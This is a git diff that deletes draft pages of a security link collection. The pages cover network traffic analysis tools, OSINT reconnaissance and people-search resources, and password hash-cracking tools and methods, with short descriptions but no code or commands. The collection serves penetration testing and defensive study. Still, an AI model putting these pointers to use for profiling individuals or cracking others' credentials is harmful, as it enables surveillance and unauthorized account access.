-[CapLoader](http://www.netresec.com/?page=CapLoader) *  CapLoader is a Windows tool designed to handle large amounts of captured network traffic. CapLoader performs indexing of PCAP/PcapNG files and visualizes their contents as a list of TCP and UDP flows. Users can select the flows of interest and quickly filter out those packets from the loaded PCAP files. Sending the selected flows/packets to a packet analyzer tool like Wireshark or NetworkMiner is then just a mouse click away. 
-
-[Network Miner](http://www.netresec.com/?page=NetworkMiner)
-* NetworkMiner is a Network Forensic Analysis Tool (NFAT) for Windows (but also works in Linux / Mac OS X / FreeBSD). NetworkMiner can be used as a passive network sniffer/packet capturing tool in order to detect operating systems, sessions, hostnames, open ports etc. without putting any traffic on the network. NetworkMiner can also parse PCAP files for off-line analysis and to regenerate/reassemble transmitted files and certificates from PCAP files.
-
-
-
-
-
-
-
-
-
-
-### <a name="papers">Papers</a>
-
-[Network Profiling Using Flow](https://resources.sei.cmu.edu/asset_files/technicalreport/2012_005_001_28167.pdf)
-* This report provides a step-by-step guide for profiling—discovering public-facing assets on a  network—using network flow (netflow) data. Netflow data can be used for forensic purposes, for  finding malicious activity, and for determining appropriate prioritization settings. The goal of this  report is to create a profile to see a potential  attacker’s view of an external network.   Readers will learn how to choose a data set, find the top assets and services with the most traffic  on the network, and profile several services. A cas e study provides an example of the profiling  process. The underlying concepts of using netflow data are presented so that readers can apply the  approach to other cases. A reader using this repor t to profile a network can expect to end with a  list of public-facing assets and the ports on which  each is communicating and may also learn other  pertinent information, such as external IP addresses, to which the asset is connecting. This report  also provides ideas for using, maintaining, and reporting on findings. The appendices include an  example profile and scripts for running the commands in the report. The scripts are a summary  only and cannot replace reading and understanding this report.
-
-[Making the Most of OSSEC](http://www.ossec.net/files/Making_the_Most_of_OSSEC.pdf)
-
-[Using SiLK for Network  Traffic Analysis](https://tools.netsa.cert.org/silk/analysis-handbook.pdf)
-
-
-
-
-
-
-
-
-
-
-### <a name="tricks">Tricks & Tips</a>
-[Using rwuniq for Top-10 Lists](https://tools.netsa.cert.org/confluence/display/tt/Using+rwuniq+for+Top-10+Lists)
-
-
-
-### Other
-
-[SweetSecurity](https://github.com/TravisFSmith/SweetSecurity)
-* Scripts to setup and install Bro IDS, Elastic Search, Logstash, Kibana, and Critical Stack on a Raspberry Pi 3 device.
\ No newline at end of file
diff --git a/Draft/Open Source Intelligence.md b/Draft/Open Source Intelligence.md
deleted file mode 100755
index effd7ae..0000000
--- a/Draft/Open Source Intelligence.md	
+++ /dev/null
@@ -1,329 +0,0 @@
-## Open Source Intelligence
-
-
-### TOC
-* Cull
-* [General](#general)
-* [Articles/Writeups](#writeups)
-* [Presentations & Talks](#talks)
-* [Tools](#tools))
-* [CVS/Git/Similar](#cvs)
-* [DNS Stuff/related](#dns)
-* [Email Gathering](#email)
-* [Fancy Search Engines](#search)
-* [General Meta Data](#meta)
-* [General Data Scrapers](#scrape)
-* [Google Hacking](#gh)
-* [Site Specific Tools](#site)
-* [Social Media Search/Enumeration](#social)
-* [Company/People Searching](#ppl)
-* [Reference Sites](#reference)
-* [Miscellaneous](#misc)
-
-
-
-
-#### Cull 
-http://computercrimeinfo.com/cleaningid.html
-[OSINT - onstrat](http://www.onstrat.com/osint/)
-[PDF Creative Commons OSINT toolbag guide](http://www.phibetaiota.net/wp-content/uploads/2013/07/2013-07-11-OSINT-2ool-Kit-On-The-Go-Bag-O-Tradecraft.pdf)
-http://toddington.com/resources/
-www.osintinsight.com/shared.php?user=Mediaquest&folderid=0\
-* Add list of Sources:
-* UCC - Uniform Commercial Code; DOC - Current Industrial Patents; DMV - Vehicle Ownership applications; Patents - Patent DBs; Operating Licenses/Permits; Trade Journals;
-#### End cull
-
-
-
-
---------------------
-### <a name="general"></a>General
-General
-* SWOT - Strengths, Weaknesses, Opportunities, Threats
-* 101
-	* [Open Source Intelligence - Wikipedia](http://en.wikipedia.org/wiki/Open-source_intelligence)
-* Alerting
-* [Google Trends](https://trends.google.com/trends/)
-		* See what are the popular related topics people are searching for. This will help widen your search scope.
-	* [Google Alerts](https://www.google.com/alerts)
-		* Google Alerts are email updates of the latest relevant Google results (web, news, etc.) based on your queries.
-	* [PasteLert](https://www.andrewmohawk.com/pasteLert/)
-		* PasteLert is a simple system to search pastebin.com and set up alerts (like google alerts) for pastebin.com entries. This means you will automatically recieve email whenever your term(s) is/are found in new pastebin entries!
-* Educational
-	* [Intelligence Gathering - PTES](http://www.pentest-standard.org/index.php/Intelligence_Gathering)
-	* [Corporate Espionage without the Hassle of Committing Felonies](https://www.slideshare.net/JohnCABambenek/corporate-espionage-without-the-hassle-of-committing-felonies)
-* General
-	* [NATO Open Source Intelligence Handbook](http://www.oss.net/dynamaster/file_archive/030201/ca5fb66734f540fbb4f8f6ef759b258c/NATO%20OSINT%20Handbook%20v1.2%20%2d%20Jan%202002.pdf)
-* OSINT Based News
-	* [JustSecurity](https://www.justsecurity.org/)
-		* Just Security is an online forum for the rigorous analysis of U.S. national security law and policy. We aim to promote principled and pragmatic solutions to national security problems that decision-makers face. Our Board of Editors includes individuals with significant government experience, civil society attorneys, academics, and other leading voices. Just Security is based at the Center for Human Rights and Global Justice at New York University School of Law.
-	* [OSINTInsight](http://www.osintinsight.com/shared.php?user=Mediaquest&folderid=0)
-	* [Janes](http://www.janes.com/)
-	* [bell?ngcat](https://www.bellingcat.com/) 
-		* By and for citizen investigative journalists
-	* [NightWatch](http://www.kforcegov.com/Solutions/IAO/NightWatch/About.aspx)
-		* NightWatch is an executive commentary and analysis of events that pose or advance threats to US national security interests. It is deliberately edgy in the interest of clarity and brevity. As a product for executives, the distribution and all feedback comments are anonymous. 
-* Resources
-	* [Awesome-OSINT](https://github.com/jivoi/awesome-osint)
-	* [OSINT Framework](http://osintframework.com/)
-	* [OSINT Resources - greynetwork2](https://sites.google.com/site/greynetwork2/home/osint-resources)
-	* [Intel Techniques - Links](http://www.inteltechniques.com/links.html)
-	* [toddington - resources](https://www.toddington.com/resources/)
-	* [onstrat - osint](http://www.onstrat.com/osint/)
-	* http://osintinsight.com/shared.php?expand=169,175&folderid=0&user=Mediaquest
-* Writeups
-	* [Fantastic OSINT and where to find it - blindseeker/malware focused](http://archive.is/sYzcP#selection-62.0-62.1)
-	* [Some blog posts describing/bringing you up to speed on OSINT by krypt3ia](http://krypt3ia.wordpress.com/2012/01/11/the-subtle-art-of-osint/)
-	* [Glass Reflections in Pictures + OSINT = More Accurate Location](http://blog.ioactive.com/2014/05/glass-reflections-in-pictures-osint.html)
-	* [Exploring the Github Firehose](http://blog.scalyr.com/2013/10/exploring-the-github-firehose/)
-	* [OSINT Through Sender Policy Framework (SPF) Records](https://community.rapid7.com/community/infosec/blog/2015/02/23/osint-through-sender-policy-framework-spf-records)
-* Talks & Presentations
-	* [Cognitive Bias and Critical Thinking in Open Source Intelligence - Defcamp 2014](https://www.youtube.com/watch?v=pVAM21UERLU&index=24&list=PLnwq8gv9MEKgSryzYIFhpmCcqnVzdUWfH)
-	* [Dark Arts of OSINT Skydogcon](https://www.youtube.com/watch?v=062pLOoZhk8)
-	* [Developing a Open Source Threat Intelligence Program—Edward McCabe](http://www.irongeek.com/i.php?page=videos/circlecitycon2014/105-developing-a-open-source-threat-intelligence-program-edward-mccabe)
-		* What if you could get out in front of common threats such as botnets, scanners and malware? Good news, you can. Learn about one geeks struggle with life on the Internet of (bad) things when it comes to being online, identifying “odd” things, and developing an Open Source Threat Intelligence Program from Open Source Tools and Public Sources.
-	* [Corporate Espionage: Gathering Actionable Intelligence Via Covert Operations - Brent White - Defcon22](https://www.youtube.com/watch?v=D2N6FclMMTg)
-	* [How to Use Python to Spy on Your Friends: Web APIs, Recon ng, & OSINT](https://www.youtube.com/watch?v=BOjz7NfsLpA)
-	* [Practical OSINT - Shane MacDougall](https://www.youtube.com/watch?v=cLmEJLy7dv8)
-		*  There’s more to life to OSINT than google scraping and social media harvesting. Learn some practical methods to automate information gathering, explore some of the most useful tools, and learn how to recognize valuable data when you see it. Not only will we explore various tools, attendees will get access to unpublished transforms they can use/modify for their own use.
-	* [Pwning People Personally - Josh Schwartz](https://www.youtube.com/watch?v=T2Ha-ZLZTz0)
-	* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
-		* Networks don't need to be hacked for information to be compromised. This is particularly true for organizations that are trying to keep trade secrets. While we hear a lot about personal privacy, little is said in regard to organizational privacy. Organizations, in fact, leak information at a much greater rate than individuals, and usually do so with little fanfare. There are greater consequences for organizations when information is leaked because the secrets often fall into the hands of competitors. This talk uses a variety of real world examples to show how trade secrets are leaked online, and how organizational privacy is compromised by seemingly innocent use of The Internet.
-	* [ZOMG Its OSINT Heaven Tazz Tazz](https://www.youtube.com/watch?v=cLmEJLy7dv8)
-
-
-
-
-
-
-
-
-
-
--------------
-### <a name="tools"></a>OSINT Tools/Resources
-**Tools**
-* [blacksheepwall](https://github.com/tomsteele/blacksheepwall)
-	* blacksheepwall is a hostname reconnaissance tool
-* [Creepy.py](http://ilektrojohn.github.io/creepy/)
-	* Description: Creepy is a geolocation OSINT tool. Gathers geolocation related information from online sources, and allows for presentation on map, search filtering based on exact location and/or date, export in csv format or kml for further analysis in Google Maps.
-* [Maltego](https://www.paterva.com/web6/products/maltego.php)
-	* Description: What you use to tie everything together.
-* [OpenRefine](https://github.com/OpenRefine/OpenRefine)	
-	* Description: OpenRefine is a power tool that allows you to load data, understand it, clean it up, reconcile it to master database, and augment it with data coming from Freebase or other web sources. All with the comfort and privacy of your own computer.
-* [Oryon C Portable](http://osintinsight.com/oryon.php)
-	* Oryon C Portable is a web browser designed to assist researchers in conducting Open Source Intelligence investigations. Oryon comes with dozens of pre-installed tools and a select set of links cataloged by category – including those that can be found in the OI Shared Resources.
-* [OSINT Mantra](http://www.getmantra.com/hackery/osint.html)
-* [Recon-ng](https://bitbucket.org/LaNMaSteR53/recon-ng)
-	* Description: Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.
-* [TouchGraph SEO Browser](http://www.touchgraph.com/seo)
-	* Use this free Java application to explore the connections between related websites.
-
-
-------------------
-#### <a name="ppl"></a>Company/People Searching
-Company/People Searching
-* [data.com](https://www.data.com/)
-* [LittleSis](https://littlesis.org/)
-	* LittleSis is a free database of who-knows-who at the heights of business and government.
-* [Jigsaw](http://jigsawbusinessgroup.com/what-we-do/people/)
-	* Jigsaw is a prospecting tool used by sales professionals, marketers and recruiters to get fresh and accurate sales leads and business contact information.
-* [Spokeo](https://www.spokeo.com/)
-	* Spokeo is a people search engine that organizes white pages listings, public records and social network information into simple profiles to help you safely find and learn about people.\
-* [Hoovers](http://www.hoovers.com/)
-	* Search over 85 million companies within 900 industry segments; Hoover's Reports Easy-to-read reports on key competitors, financials, and executives
-* [Market Visual](http://www.marketvisual.com/)
-	* Search Professionals by Name, Company or Title
-* [Glass Door](https://www.glassdoor.com/)
-	* Search jobs then look inside. Company salaries, reviews, interview questions, and more all posted anonymously by employees and job seekers.
-* [192](http://www.192.com/)
-	* Find people, businesses and places in the UK with 192.com. Directory enquiries, a people finder, business listings and detailed maps with aerial photos.
-* [corporationwiki](https://www.corporationwiki.com/)
-* [orbis](https://orbisdirectory.bvdinfo.com/version-2017821/OrbisDirectory/Companies)
-	* Company information across the globe
-
-
--------------
-#### <a name="cvs"></a>CVS/Git/Similar Focused
-CVS/Git/Similar Focused
-* [repo-supervisor](https://github.com/auth0/repo-supervisor)
-* [GitPrey](https://github.com/repoog/GitPrey)
-	* GitPrey is a tool for searching sensitive information or data according to company name or key word something.The design mind is from searching sensitive data leakling in Github:
-* [git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
-	* A tool to capture all the git secrets by leveraging multiple open source git searching tools
-* [github-firehose](https://www.npmjs.com/package/github-firehose)
-	* A library that will connect to github and emit events from the Github Event API in near-real-time
-	* [Exploring the Github Firehose](http://blog.scalyr.com/2013/10/exploring-the-github-firehose/)
-* [Gitem](https://github.com/mschwager/gitem)
-	* Gitem is a tool for performing Github organizational reconnaissance.
-* [Truffle Hog](https://github.com/dxa4481/truffleHog)
-	* Searches through git repositories for high entropy strings, digging deep into commit history and branches. This is effective at finding secrets accidentally committed that contain high entropy.
-* [dvcs-ripper](https://github.com/kost/dvcs-ripper)
-	* Rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr, ... It can rip repositories even 
-when directory browsing is turned off.
-* [Truffle Hog](https://github.com/dxa4481/truffleHog)
-	* Searches through git repositories for high entropy strings, digging deep into commit history
-
-
-
-----------------
-###### <a name="dns"></a>DNS Stuff
-DNS Stuff
-* [dauntless](https://github.com/cmeister2/dauntless)
-	* Tools for analysing the forward DNS data set published at https://scans.io/study/sonar.fdns_v2
-* [dnstwist](https://github.com/elceef/dnstwist)
-	* Domain name permutation engine for detecting typo squatting, phishing and corporate espionage
-* [typofinder](https://github.com/nccgroup/typofinder)
-	* Typofinder for domain typo discovery
-
-
-
-
--------------
-#### <a name="email"></a>Email Gathering/Reconnaissance
-Email Gathering/Reconnaissance
-	* [OSINT Through Sender Policy Framework Records](https://community.rapid7.com/community/infosec/blog/2015/02/23/osint-through-sender-policy-framework-spf-records)
-* Tools
-	* [SimplyEmail](https://github.com/killswitch-GUI/SimplyEmail)
-		* What is the simple email recon tool? This tool was based off the work of theHarvester and kind of a port of the functionality. This was just an expansion of what was used to build theHarvester and will incorporate his work but allow users to easily build Modules for the Framework. Which I felt was desperately needed after building my first module for theHarvester.
-	* [Email Reconnaissance and Phishing Template Generation Made Simple](https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/)
-	* [theHarvester](https://github.com/laramies/theHarvester)
-		* theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports/ banners, and employee names from different public sources (search engines, pgp key servers).
-	* [discover.sh](https://github.com/leebaird/discover)
-		* For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.
-
-
-
-
-
--------------
-#### <a name="search"></a>Fancy Search Engines
-Fancy Search Engines
-	* [Entity Cube](http://entitycube.research.microsoft.com/) 
-		* EntityCube is a research prototype for exploring object-level search technologies, which automatically summarizes the Web for entities (such as people, locations and organizations) with a modest web presence.
-	* [Silobreaker](http://www.silobreaker.com/)
-		* Enterprise Semantic Search Engine, allows virtualisation of data, analytics and exploration of key data.
-	* [iSeek](http://www.iseek.com/#/web)
-		* Another handy search engine that break results down into easy to manage categories.
-	* [Carrot2](http://search.carrot2.org/stable/search)
-		*  Carrot2 organizes your search results into topics. With an instant overview of what's available, you will quickly find what you're looking for. 
-	* [Sqoop](http://sqoop.com/)
-		* OSINT search engine of public documents(handy)
-	* [GlobalFileSearch](https://ftplike.com)
-		* An FTP Search Engine that may come in handy.
-
-
--------------
-#### <a name="meta"></a>General Meta Data
-General Meta-Data
-* [Just-Metadata](https://github.com/ChrisTruncer/Just-Metadata)
-	* Just-Metadata is a tool that can be used to gather intelligence information passively about a large number of IP addresses, and attempt to extrapolate relationships that might not otherwise be seen. Just-Metadata has "gather" modules which are used to gather metadata about IPs loaded into the framework across multiple resources on the internet. Just-Metadata also has "analysis" modules. These are used to analyze the data loaded Just-Metadata and perform various operations that can identify potential relationships between the loaded systems.
-* [MetaGooFil](https://code.google.com/p/metagoofil/)	
-	* Description: Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) belonging to a target company. The tool will perform a search in Google to identify and download the documents to local disk and then will extract the metadata with different libraries like Hachoir, PdfMiner and others. With the results it will generate a report with usernames, software versions and servers or machine names that will help Penetration testers in the information gathering phase.
-* [Metashield Analyzer](https://metashieldanalyzer.elevenpaths.com/)
-	* Description: Metadata documents can help a malicious user to obtain information that is beyond our control in an enterprise environment. Metashield Analyzer is an online service that allows easily check if your office documents contain metadata.
-* [PowerMeta](https://github.com/dafthack/PowerMeta)
-	* PowerMeta searches for publicly available files hosted on various websites for a particular domain by using specially crafted Google, and Bing searches. It then allows for the download of those files from the target domain. After retrieving the files, the metadata associated with them can be analyzed by PowerMeta. Some interesting things commonly found in metadata are usernames, domains, software titles, and computer names.
-
-
-
-
-
-
--------------
-#### <a name="scrape"></a> General Data Scrapers
-General Data Scrapers
-* [XRAY](https://github.com/evilsocket/xray)
-	* XRay is a tool for recon, mapping and OSINT gathering from public networks.
-* [NameCheck](https://www.namecheck.com)
-	* Search usernames across multiple services/domain registries
-* [TheHarvester](From: https://code.google.com/p/theharvester/)
-	* Description: The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database. This tool is intended to help Penetration testers in the early stages of the penetration test in order to understand the customer footprint on the Internet. It is also useful for anyone that wants to know what an attacker can see about their organization. 
-* [OSINT OPSEC Tool](https://github.com/hyprwired/osint-opsec-tool)
-	* Description: The OSINT OPSEC Tool monitors multiple 21st Century OSINT sources real-time for keywords, then analyses the results, generates alerts, and maps trends of the data, finding all sorts of info people probably don't want others to see... 
-
-
--------------
-#### <a name="gh"></a>Google Hacking
-Google Hacking
-* [Google Hacking for Penetration Testers](https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf)
-* [ExpoitDB archive of the google hacking database](http://www.exploit-db.com/google-dorks/)
-* [Google Hacking Database](http://www.hackersforcharity.org/ghdb/)
-	* We call them 'googledorks': Inept or foolish people as revealed by Google. Whatever you call these fools, you've found the center of the Google Hacking Universe! 
-* [Google Hacking - Search Diggity tool](http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/)
-	* SearchDiggity 3.1 is the primary attack tool of the Google Hacking Diggity Project. It is Bishop Fox’s MS Windows GUI application that serves as a front-end to the most recent versions of our Diggity tools: GoogleDiggity, BingDiggity, Bing LinkFromDomainDiggity, CodeSearchDiggity, DLPDiggity, FlashDiggity, MalwareDiggity, PortScanDiggity, SHODANDiggity, BingBinaryMalwareSearch, and NotInMyBackYard Diggity.
-* [GoogD0rker](https://github.com/ZephrFish/GoogD0rker)
-	* GoogD0rker is a tool for firing off google dorks against a target domain, it is purely for OSINT against a specific target domain. Designed for OSX originally however googD0rker txt now works on all nix platforms.
-
-
-
-
-
------------
-### <a name="nin"></a>Network Information Search Engines
-Network Information Search Engines
-* [Whoisology](https://whoisology.com/)
-	* Whoisology is a domain name ownership archive with literally billions of searchable and cross referenced domain name whois records. 
-
-
-
-
-
-------------------------
-##### <a name="site"></a>Site Specific
-Site Specific Tools
-* AWS
-	* [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
-		* AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for loot. It's similar to a subdomain bruteforcer but is made specifically for S3 buckets and also has some extra features that allow you to grep for delicious files as well as download interesting files if you're not afraid to quickly fill up your hard drive.
-* LinkedIn
-	* [InSpy](https://github.com/gojhonny/InSpy)
-		* A LinkedIn enumeration tool
-	* [linkedin](https://github.com/eracle/linkedin)
-		* Linkedin Scraper using Selenium Web Driver, Firefox 45, Ubuntu and Scrapy
-	* [LinkedInt: A LinkedIn scraper for reconnaissance during adversary simulation](https://github.com/mdsecactivebreach/LinkedInt)
-	* [LinkedIn Gatherer](https://github.com/DisK0nn3cT/linkedin-gatherer)
-	* [socilab](http://socilab.com/#home)
-		* This site allows users to visualize and analyze their LinkedIn network using methods derived from social-scientific research. Full sample output is shown here. The site is free and open-source. Have fun!
-* Twitter
-	* [OneMillionTweetMap](http://onemilliontweetmap.com/)
-		* This page maps the last geolocalized tweets delivered by the twitter stream API. ... YES - IN REAL-TIME - and we keep "only" the last one million tweets.
-	* [tweets_analyzer](https://github.com/x0rz/tweets_analyzer)
-		* Tweets metadata scraper & activity analyzer
-	* [Tweet Archivist](https://www.tweetarchivist.com/)
-	* [tweets_analyzer](https://github.com/x0rz/tweets_analyzer)
-		* Tweets metadata scraper & activity analyzer
-	* [Tinfoleak](http://vicenteaguileradiaz.com/tools/)
-		* tinfoleak is a simple Python script that allow to obtain: basic information about a Twitter user (name, picture, location, followers, etc.); devices and operating systems used by the Twitter user; applications and social networks used by the Twitter user; place and geolocation coordinates to generate a tracking map of locations visited; show user tweets in Google Earth!; download all pics from a Twitter user; hashtags used by the Twitter user and when are used (date and time); user mentions by the the Twitter user and when are occurred (date and time); topics used by the Twitter user
-* Github
-	* [Github dorks - finding vulns](http://blog.conviso.com.br/2013/06/github-hacking-for-fun-and-sensitive.html)
-
-
-
-
-
-
-
-
-
-
-
----------------
-### <a name="social"></a>Social Media Search/Enumeration
-Social Media Search/Enumeration
-* [CheckUsernames](http://checkusernames.com/)
-	* Check the use of your brand or username on 160 Social Networks
-* [NameCHK](https://namechk.com/)
-	* Check to see if your desired username or vanity url is still available at dozens of popular Social Networking and Social Bookmarking websites.
-* [Scythe](https://github.com/ChrisJohnRiley/Scythe)
-	* The ability to test a range of email addresses across a range of sites (e.g. social media, blogging platforms, etc...) to find where those targets have active accounts. This can be useful in a social engineering test where you have email accounts for a company and want to list where these users have used their work email for 3rd party web based services.
-* [Social Mention](http://www.socialmention.com/)
-	* Social Mention is a social media search engine that searches user-generated content such as blogs, comments, bookmarks, events, news, videos, and more
-* [Whos Talkin](http://www.whostalkin.com/)
-	* social media search tool that allows users to search for conversations surrounding the topics that they care about most.
-
-	
-
-
-
-
-
diff --git a/Draft/Password Bruting and Hashcracking.md b/Draft/Password Bruting and Hashcracking.md
deleted file mode 100755
index 647b4e9..0000000
--- a/Draft/Password Bruting and Hashcracking.md	
+++ /dev/null
@@ -1,251 +0,0 @@
-## Password Bruting and Hashcracking
-
-Sort
-
-
-TOC
-
-Cull
-*[General](#general)
-* [Making Better Passwords](#better)
-* [Cracking Passwords/Hashes](#crack)
-* [General Cracking Tools](#generalt)
-* [App Specific Tools](#appt)
-* [Write-ups/Guides](#writeup)
-* [Miscellaneous](#misc)
-* [Wordlists](#wordlist)
-* [Wordlist Generation](#)
-* [Talks & Presentations](#)
-* [Papers](#papers)
-
-
-### Cull
-
-http://blog.erratasec.com/2011/06/password-cracking-mining-and-gpus.html#.VG3xspPF_tw
-
-http://arstechnica.com/security/2013/03/how-i-became-a-password-cracker/
-
-[Gladius](https://github.com/praetorian-inc/gladius)
-	* Automated Responder/secretsdump.py cracking. Gladius provides an automated method for cracking credentials from various sources during an engagement. We currently crack hashes from Responder, secretsdump.py, and smart_hashdump.
-
-* Wordlists sorted by popularity originally created for password generation and testing
-### End cull
-
-
-
-
-
-
-### <a name="general">General</a>
-
-[HashView](https://github.com/hashview/hashview)
-* Hashview is a tool for security professionals to help organize and automate the repetitious tasks related to password cracking. Hashview is a web application that manages hashcat (https://hashcat.net) commands. Hashview strives to bring constiency in your hashcat tasks while delivering analytics with pretty pictures ready for ctrl+c, ctrl+v into your reports.
-
-
-[Hashtag](http://www.smeegesec.com/2013/11/hashtag-password-hash-identification.html)
-* Password hash identification tool written in python
-
-[List of hash types/examples](https://docs.google.com/file/d/0B0TzWBRmg5pWWUtxRTFMbFRRZzA/edit)
-
-[Password Recovery Speeds](http://www.lockdown.co.uk/?pg=combi)
-* Password cracking time measurements
-
-
-
-
-
-
-
-### <a name="better">Making Better Passwords</a>
-
-
-[Mnemonic Password Formulas](http://uninformed.org/?v=all&a=33&t=sumry)
-*  The current information technology landscape is cluttered with a large number of information systems that each have their own individual authentication schemes. Even with single sign-on and multi-system authentication methods, systems within disparate management domains are likely to be utilized by users of various levels of involvement within the landscape as a whole. Due to this complexity and the abundance of authentication requirements, many users are required to manage numerous credentials across various systems. This has given rise to many different insecurities relating to the selection and management of passwords. This paper details a subset of issues facing users and managers of authentication systems involving passwords, discusses current approaches to mitigating those issues, and finally introduces a new method for password management and recalls termed Mnemonic Password Formulas. 
-
-
-
-
-
-### <a name="crack">Cracking Passwords/Hashes</a>
-
-
-[Introduction to Cracking Hashes](http://n0where.net/introduction-break-that-hash/)
-* Good introduction source to hash cracking.
-
-[Cracking Corporate Passwords Exploiting Password Policy Weaknesses - Minga Rick Redm - Derbycon3](https://www.youtube.com/watch?v=qR-qRUbeKAo)
-
-[HashView](https://github.com/hashview/hashview)
-* Hashview is a tool for security professionals to help organize and automate the repetitious tasks related to password cracking. Hashview is a web application that manages hashcat (https://hashcat.net) commands. Hashview strives to bring constiency in your hashcat tasks while delivering analytics with pretty pictures ready for ctrl+c, ctrl+v into your reports.
-
-[Cracking Active Directory Passwords or ?How to Cook AD Crack"](https://www.sans.org/reading-room/whitepapers/testing/cracking-active-directory-passwords-how-cook-ad-crack-37940)
-
-[Cracking Corporate Passwords ? Exploiting Password Policy Weaknesses - Minga / Rick Redman Derbycon 2013](https://www.irongeek.com/i.php?page=videos/derbycon3/1301-cracking-corporate-passwords-exploiting-password-policy-weaknesses-minga-rick-redman)
-
-
-
-
-
-### <a name="appt">App Specific Tools(as in single application focus)</a>
-
-[crackxls2003 0.4](https://github.com/GavinSmith0123/crackxls2003)
-* This program may be used to break the encryption on Microsoft Excel and Microsoft Word file which have been encrypted using the RC4 method, which uses a 40-bit-long key. This was the default encryption method in Word and Excel 97/2000/2002/2003. This program will not work on files encrypted using Word or Excel 2007 or later, or for versions 95 or earlier. It will not work if a file was encrypted with a non-default method. Additionally, documents created with the Windows system locale set to France may use a different encryption method.
-
-
-
-
-
-
-
-#### OCL/Hashcat
-
-[OCL hashcat wiki](http://hashcat.net/wiki/)
-* Its the Wiki
-
-[OCL hashcat](http://n0where.net/introduction-break-that-hash/)
-* It?s OCL hashcat
-
-Hashcat attacks
-[Mask atttack](http://hashcat.net/wiki/doku.php?id=mask_attack)
-* Try all combinations from a given keyspace just like in Brute-Force attack, but more specific. 
-
-[Combinator attack](http://hashcat.net/wiki/doku.php?id=combinator_attack)
-* Each word of a dictionary is appended to each word in a dictionary. 
-
-[Dictionary attack](http://hashcat.net/wiki/doku.php?id=dictionary_attack)
-* The dictionary attack is a very simple attack mode. It is also known as a ?Wordlist attack?. 
-
-[Fingerprint Attack](http://hashcat.net/wiki/doku.php?id=fingerprint_attack)
-* The Fingerprint attack is a combination of the results of the expander with a combination engine. It is an automatically generated attack on pattern that works fine on GPGPU. 
-
-[Hybrid attack](http://hashcat.net/wiki/doku.php?id=hybrid_attack)
-* Basically, the hybrid attack is just a Combinator attack. One side is simply a dictionary, the other is the result of a Brute-Force attack. In other words, the full Brute-Force keyspace is either appended or prepended to each of the words from the dictionary. That's why it's called ?hybrid?. 
-
-[Mask attack](http://hashcat.net/wiki/doku.php?id=mask_attack)
-* Try all combinations from a given keyspace just like in Brute-Force attack, but more specific. 
-
-[Permutation attack[(http://hashcat.net/wiki/doku.php?id=permutation_attack)
-* Each word in a dictionary generates all permutations of itself. 
-
-[Rule Based attack](http://hashcat.net/wiki/doku.php?id=rule_based_attack)
-* The rule-based attack is one of the most complicated of all the attack modes. The reason for this is very simple. The rule-based attack is like a programming language designed for password candidate generation. It has functions to modify, cut or extend words and has conditional operators to skip some, etc. That makes it the most flexible, accurate and efficient attack. 
-
-[Table Lookup attack](http://hashcat.net/wiki/doku.php?id=table_lookup_attack)
-* With each word in our dictionary, it automatically generates masks as in a batch of Mask attack. 
-
-[Toggle-Case attack](http://hashcat.net/wiki/doku.php?id=toggle_case_attack)
-* For each word in a dictionary, all possible combinations of upper- and lower-case variants are generated. 
-
-[OCLHashcat Hash Examples + hash code](https://hashcat.net/wiki/doku.php?id=example_hashes)
-
-
-
-
-
-
-
-### <a name="writeup">Writeups</a>
-
-[How to crack password hashes efficiently](http://www.dafthack.com/blog/howtocrackpasswordhashesefficiently)
-* Excellent writeup/methodology explanation
-
-[Building a Better GPU based hash cracking methodology](https://blog.netspi.com/gpu-password-cracking-building-a-bette Penr-methodology/)
-* Bit basic advice but still great advice nonetheless
-
-[5min Guide to setting up a GPU cracker in the cloud on AWS + a script to automate it all](http://thehackerblog.com/amazon-ec2-gpu-hvm-spot-instance-cracking-setup-tutorial/)
-
-[Dumping a Domains worth of passwords using mimikatz](http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html)
-
-[Dump Windows password hashes efficiently - Part 1](http://www.bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html)
-
-
-
-
-### <a name="generalt">Tools</a>
-
-[Patator](https://github.com/lanjelot/patator)
-* Patator was written out of frustration from using Hydra, Medusa, Ncrack, Metasploit modules and Nmap NSE scripts for password guessing attacks. I opted for a different approach in order to not create yet another brute-forcing tool and avoid repeating the same shortcomings. Patator is a multi-threaded tool written in Python, that strives to be more reliable and flexible than his fellow predecessors.
-
-[Firefox password cracker](https://github.com/pradeep1288/ffpasscracker)
-
-[Cracklord](https://github.com/jmmcatee/cracklord)
-* CrackLord is a system designed to provide a scalable, pluggable, and distributed system for both password cracking as well as any other jobs needing lots of computing resources. Better said, CrackLord is a way to load balance the resources, such as CPU, GPU, Network, etc. from multiple hardware systems into a single queueing service across two primary services: the Resource and Queue. It won't make these tasks faster, but it will make it easier to manage them.
-
-[Dagon](https://github.com/Ekultek/Dagon)
-* Named after the prince of Hell, Dagon (day-gone) is an advanced hash cracking and manipulation system, capable of bruteforcing multiple hash types, creating bruteforce dictionaries, automatic hashing algorithm verification, random salt generation from Unicode to ASCII, and much more.
-
-
-
-
-
-### <a name="wordlistgen">Wordlist Generation</a>
-
-[GitDigger](https://github.com/wick2o/gitdigger)
-* gitDigger: Creating realworld wordlists from github hosted data.
-
-[Wikigen](https://github.com/zombiesam/wikigen)
-* A script to generate wordlists out of wikipedia pages. Should support most of the subdomains. Some ugly code may occur
-
-[CeWL](http://digi.ninja/projects/cewl.php)
-* CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.
-
